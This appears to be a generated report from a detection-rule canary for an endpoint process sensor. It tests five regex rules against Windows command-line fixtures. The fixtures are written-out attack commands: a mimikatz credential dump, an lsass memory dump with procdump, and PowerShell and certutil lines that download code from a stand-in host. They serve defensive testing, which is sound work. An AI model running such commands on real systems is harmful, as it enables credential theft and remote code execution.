# KERNEL_PROCESS Synthetic Rule Canary

**Status:** `PASS`

This scan compiles R2001-R2005 regexes against in-memory command-line fixtures only. It does not create a process, execute a command, access a URL, dump credentials, or invoke enforcement.

| Rule | Positive command line | Positive match | Benign match |
|---|---|---:|---:|
| `R2001` | `C:\\Lab\\mimikatz.exe sekurlsa::logonpasswords` | `True` | `False` |
| `R2002` | `C:\\Windows\\System32\\svchost.exe -k netsvcs PROCESS_HOLLOW` | `True` | `False` |
| `R2003` | `powershell.exe -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')` | `True` | `False` |
| `R2004` | `C:\\Windows\\System32\\certutil.exe -urlcache -f https://example.invalid/a C:\\Users\\Public\\a.bin` | `True` | `False` |
| `R2005` | `C:\\Lab\\procdump.exe -ma lsass.exe C:\\Lab\\out.dmp` | `True` | `False` |

## Findings

- All five configured regexes matched the positive fixture and rejected the benign fixture.

## Sensor boundary note

The canary proves command-line pattern behavior only. Full process-sensor qualification still requires a Windows ETW event with ImageName, CommandLine, ParentId, canonical event, and forensic record; prevention remains closed.

